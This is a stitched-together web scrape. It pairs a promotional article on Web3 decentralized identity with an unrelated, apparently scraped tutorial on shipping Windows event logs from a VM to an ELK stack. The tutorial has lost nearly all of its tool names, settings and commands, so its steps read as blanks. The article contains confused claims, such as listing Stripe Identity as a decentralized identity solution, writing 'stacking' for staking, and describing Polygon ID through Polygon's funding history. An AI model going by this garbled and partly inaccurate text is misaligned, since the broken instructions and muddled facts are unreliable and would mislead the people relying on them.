There's growing awareness of these risks, and new solutions are being developed to make online experiences safer. Web3 and decentralized identity solutions are reshaping how we protect our personal information online. Blockchain, a distributed ledger technology, securely stores identity information in a way that cannot be easily altered or tampered with. This ensures that your data is private and immutable, and only you decide who gets access to it. Instead of relying on traditional usernames and passwords stored in centralized servers (which are targets for hackers), decentralized identity puts you in control.

Key Features of Web3 Decentralized Identity Solutions

Web3 decentralized identity solutions are transforming how individuals and organizations manage digital identities. They offer a new way for individuals to control their data online without relying on centralized authorities like governments or big tech companies.

  • Self-Sovereign Identity (SSI)
  • Decentralized Identifiers (DIDs)
  • Verifiable Credentials (VCs)
  • Blockchain and Smart Contracts

Self-Sovereign Identity (SSI)

Self-Sovereign Identity (SSI) is all about ownership and control. Instead of relying on big companies or third parties to manage your digital identity, SSI allows you to own and manage your credentials directly. Think of it like having a digital wallet for your identity, only you decide who gets access to it, for how long, and for what purpose. Web3 leverages blockchain technology to enable SSI. When you create a decentralized identity, it’s stored securely on the blockchain. Verification happens through digital credentials, like a virtual ID card, which can be verified without exposing private details. For example, you can prove you are over 18 to access certain services without revealing your birth date.

Decentralized Identifiers (DIDs)

Web3 decentralized identifiers are changing the way we manage online identities. Unlike traditional identity systems that rely on central authorities (like governments or big companies), web3 decentralized solutions give users full control over their personal information. A web3 decentralized solution is a unique identifier that isn’t tied to any central entity. It’s created, owned, and controlled by the individual, without needing permission from any third party. They are built on blockchain technology, ensuring they are secure, private, and tamper-proof.

Verifiable Credentials (VCs)

Verifiable Credentials are digital certificates that can prove something about you, like your age, education, or membership, without revealing unnecessary details. With VCs, a person can securely share just the information needed, while maintaining privacy and control. These credentials are cryptographically signed, so they are tamper-proof and trustworthy. The decentralized nature of Web3 ensures that this process is done without a third party. Instead of trusting a central entity, trust is placed in the blockchain and cryptographic techniques. This makes online identities more secure, transparent, and self-sovereign.

Blockchain and Smart Contracts

Smart contracts play an important role by automating processes and verifying actions without needing intermediaries. For example, a smart contract can automatically verify your identity when you access a service, based on the information stored on the blockchain. Users can grant or revoke access to their identity data using smart contracts. Organizations or services requesting access must meet the smart contract’s conditions.

Blockchain, a distributed ledger technology, securely stores identity information in a way that cannot be easily altered or tampered with. Decentralized identity (DID) solutions allow users to own and control their data without relying on big tech companies. Instead of storing identity details on centralized servers, blockchain records only essential proofs, ensuring privacy and security.

How Web3 Decentralized Identity Solutions Improve Online Security

Web3 decentralized identity solutions help keep your personal information safe online by giving you more control over your data. You don’t have to create multiple passwords or worry about data breaches exposing your private information. Instead, your credentials are securely stored in a digital wallet that only you can access. This reduces the risk of identity theft, fraud, and hacking.

  1. Eliminate Central Points of Attack
  2. Improve Privacy and Control
  3. Reduce Phishing and Credential Theft
  4. Interoperability across Platforms

Eliminate Central Points of Attack

Traditional systems store our personal information in centralized databases, making them targets for hackers. With web3 decentralized identity, your data isn’t stored in one central place. Instead, it's spread out across a network, making it much harder for hackers to access everything in one attack. This system gives you control over your information, reducing the risks that come with a single point of failure. By eliminating central points of attack, web3 decentralized identity solutions make online security stronger. Even if one part of the network is compromised, your data remains safe and secure.

Improve Privacy and Control

With Web3 decentralized identity systems, you own and manage your identity. Instead of relying on a company or service to store your data, you control who sees it and when. This means your personal information isn’t stored in one place where it can be targeted by hackers. You can choose to share only what’s necessary for a transaction or service, keeping the rest of your data private. It also helps reduce the risk of identity theft. Since your information is not stored centrally, it’s much harder for cybercriminals to access all of your details in one breach.

Reduce Phishing and Credential Theft

Web3 decentralized identity solutions are changing the way we secure our online identities. It helps reduce risks like phishing and credential theft, making online interactions safer. You don’t need to share your username and password across multiple websites. Instead, you can verify your identity securely through cryptographic keys or digital wallets. This means hackers can’t easily steal your credentials because they’re not stored in a single location. Phishing attacks, where criminals trick users into revealing sensitive information, also become less effective.

Interoperability across Platforms

With interoperability, your digital identity can work seamlessly across different services, apps, and websites without the need to create new accounts or passwords every time. Instead of relying on third-party organizations to store your information, web3 decentralized systems give you the power to share your identity securely, only with those you trust. You can log in to various platforms using the same verified information, which reduces the risks of password theft or data breaches.

Examples and Real-world Applications

Decentralized identity solutions in Web3 are gaining momentum as they offer individuals greater control over their personal data and online interactions. However, for these solutions to be adopted by more people, it is important to provide clear examples and real-world applications. Practical use cases help people understand the benefits and build trust in the technology.

  • Decentralized Finance (DeFi)
  • Supply Chain and Logistics
  • Government and Civic Applications

Decentralized Finance (DeFi)

DeFi is a financial ecosystem that operates without traditional banks, using blockchain technology to provide open, permissionless, and transparent financial services. Features of DeFi include decentralized exchanges (DEX), insurance protocols, stablecoins, yield farming, and stacking. As the DeFi ecosystem continues to grow, innovations such as Layer 2 scaling solutions, improved security mechanisms, and enhanced interoperability will drive its usage. In DeFi, users usually remain anonymous and control their data. However, this can sometimes lead to security risks or difficulties in verifying who’s behind a transaction. Web3 decentralized identity solutions provide a secure way for individuals to manage their identity without relying on a central authority. You control your personal information and share only what’s necessary for a specific interaction. This helps prevent fraud and ensures that only legitimate users are participating in DeFi platforms.

Web3 decentralized identity solutions can make healthcare more secure and efficient by giving individuals control over their health data. Instead of relying on centralized systems to store personal health information, DIS allows patients to manage and share their medical records securely. For doctors and hospitals, it’s easier to verify a patient’s identity and access accurate medical history, which can lead to quicker, more accurate treatments. Plus, since the data is decentralized, patients can access their records anytime, anywhere, and share them across different platforms without worrying about security breaches.

Government and Civic Applications

Web3 decentralized identity solutions can be integrated into voting systems for secure, anonymous, and verifiable online voting. A web3 decentralized voting system can ensure that voters are who they claim to be and that votes are recorded securely, providing transparency and preventing fraud. People have control over when and how their information is shared. For example, when applying for government services, individuals can prove they meet certain criteria (like age or residency) without revealing unnecessary details. Embracing web3 decentralized identity is about building a digital future where trust, privacy, and security come first. It empowers individuals and protects against the vulnerabilities of our current systems.

Examples of Web3 decentralized identity solutions

Polygon ID is focused on creating a more sovereign, secure, and open internet by building a network of open-source protocols that offer unified liquidity, unlimited scalability, and interoperability for developers. Over the years, Polygon has achieved significant milestones, including launching its mainnet in 2020, merging with zk-rollup platform Hermez Network in 2021, and raising $450 million in a venture financing round in 2022.

Fractal ID is dedicated to giving users control over their digital identities. They aim to move away from centralized platforms and make data ownership a standard practice. Their goal is to become a trusted provider of decentralized identity solutions for Web3, creating open-source tools that work seamlessly with blockchain ecosystems and decentralized applications (dApps). They emphasize putting users at the center of their mission, striving to empower individuals in the evolving digital landscape.

Stripe Identity is a service that helps businesses verify their customers' identities online. By using advanced technology, it quickly checks official ID documents and matches them with selfies, ensuring the person is who they claim to be. This process is fast, often taking as little as 15 seconds. Companies like Discord and Peerspace use Stripe Identity to keep their platforms safe and trustworthy.

Spruce helps people to have control over their digital identities and personal data. They focus on creating secure and private systems that let users manage their information across various online platforms. SpruceID supports developers by offering open-source tools to build user-centered applications. They are involved in developing global identity standards like W3C Verifiable Credentials and Sign-In with Ethereum. Their goal is to ensure that technology empowers users rather than limits them.

Web3 decentralized identity solutions are changing the way we protect our online presence. By giving users control over their digital identities, these solutions reduce the risks of data breaches, identity theft, and privacy violations. These improvements lead to stronger online security by eliminating password-based vulnerabilities, reducing data exposure, and enabling trustless verification. Real-world applications include decentralized finance (DeFi), healthcare, online voting, and digital passports.

Companies like Stripe Identity, Fractal ID, and Polygon ID are leading the way in making decentralized identities accessible and practical. As Web3 continues to grow, decentralized identity solutions will play a crucial role in creating a safer and more private internet. By shifting control back to users, they pave the way for a more secure and user-centric digital future.

items.title: Setting Up a Windows VM for Log Collection Using the ELK Stack - A Step-by-Step Guide
items.author: Suprim Devkota
items.content:
is vital for cybersecurity as it provides visibility into system activities, allowing organizations to monitor and track events happening within their infrastructure. They capture detailed information about user actions, network connections, application errors, and system performance, helping to detect suspicious activity such as unauthorized logins, privilege escalation, or malware execution. In the event of a cyberattack, logs become essential for forensic investigation, enabling cybersecurity professionals to trace the attacker's movements, understand the methods used, and identify the vulnerabilities exploited, leading to faster resolution and containment.

The (now often called the Elastic Stack) is a powerful, open-source suite of tools used for log management, data analysis, and visualization, comprising Elasticsearch, Logstash, and Kibana. Let us understand each tool in detail.

  • : It is a distributed JSON-based search and analytics engine that stores and indexes data. Think of it like a giant library where books (data) are stored in an organized way. When you need to find a specific piece of information (search for data), Elasticsearch helps you find it quickly by searching through the library's catalog (indexes).

  • : A server-side data processing pipeline that ingests, transforms and sends data to a desired destination. Think of it like a conveyor belt that takes raw materials (data from different sources), processes them (filters and formats the data) and moves them to an appropriate destination (Elasticsearch).

  • : A visualization layer that works on top of Elasticsearch, providing search and data visualization capabilities for data indexed in Elasticsearch. Think of it like the control panel in a car, providing you with graphs and information that give you insight to the performance and status of your system. Instead of just showing you the raw data, it helps you visualize and make sense of all the data you have.

In addition to these, Logs are typically collected using . Beats are a collection of lightweight, open-source data shippers that collect and forward data (like logs, metrics and events) from various sources to Elasticsearch or Logstash for processing and analysis.

  • In this project, I'll be using which focuses exclusively on Windows Event Logs. Think of Winlogbeat as a specialized messenger who only delivers important notes or messages (event logs) from your Windows system to a destination like Elasticsearch or Logstash.

So to wrap it all up, collects logs from the system we want to monitor and sends it to . Logstash filters and formats the raw data and sends it to which indexes the data for faster searching. Finally , lets you explore and interact with the indexed data in Elasticsearch in a user-friendly way.

In this guide, I'll walk you through setting up a Windows Virtual Machine (VM) on a host Windows system, installing the Windows OS, and configuring log collection from the VM to the host machine using the ELK Stack (Elasticsearch, Logstash, and Kibana).

By the end of this tutorial, you'll have a working ELK stack capturing Windows event logs from your VM and displaying them in Kibana for analysis.

Setting up the Windows Virtual Machine

Using or on the host machine, attach the Windows ISO file and install the Operating system. Allocate at least , and disk space for the Virtual Machine that will be used to collect logs. To ensure network connectivity configure the network settings to or

Setting Up Winlogbeat on the Virtual Machine

Once the Virtual Machine has been setup, the following things must be done to ensure that logs are properly collected and sent to the Logstash server running on the host.

Verify important logs are enabled in Event Viewer

  • Open ().

  • Expand > Security, System, Application.

  • Right-click each log category > .

    • Ensure is checked.
    • Set log size to .

  • Open Local Group Policy Editor ().

  • Navigate to: Computer Configuration > Windows Settings > Security Settings > Advanced Audit Policy Configuration.

  • Enable relevant audit policies (e.g., Logon Events, Account Management, Object Access).

In this project I enabled auditing the following policies: Audit Security Group Management, Audit Audit Policy Change, Audit Process Creation, Audit Process Termination, Audit Sensitive Privilege Use, Audit File System, Audit Registry, Audit Handle Manipulation, Audit User Account Management, Audit Logon, Audit Logoff, Audit Special Logon and Audit Security State Change.

Install & Configure Winlogbeat

  • Configure by uncommenting the following lines and adding your Host machine's IP as:

  • field specifies what feed to send to the server. The default configuration covers a large variety of relevant logs so I left that unchanged.
  • Install and Start Winlogbeat by running as Administrator and entering the following commands:
  • To ensure that firewall rules don't interfere with Winlogbeat we can run the following command to add an outbound rule to Windows Firewall.

Ensure that the winlogbeat service is running by executing the following command in Powershell: .

Setting Up ELK Stack on the Host Machine

Now that logs are sent from the virtual machine to the host machine, we have to make sure that ElasticSearch, Logstash and Kibana are installed and configured to receive, index and display the logs in the host machine.

  • Download Java JDK and install it in the host computer.
  • Set the JAVA_HOME environment variable to point to the directory.

Download & Install Elasticsearch

  • Extract to C:\Program Files\Elasticsearch (You might need to rename the downloaded directory to just Elasticsearch in order to avoid PATH TOO LONG errors.)

  • Configure as:

If asked to signin, run the following command in to generate a new password from the directory: elasticsearch-reset-password -u elastic

Download & Install Logstash

  • To ensure that firewall rules don't interfere with Logstash we can run the following command to add an inbound rule to Windows Firewall.

Download & Install Kibana

Create Index Pattern and validate logs in Kibana
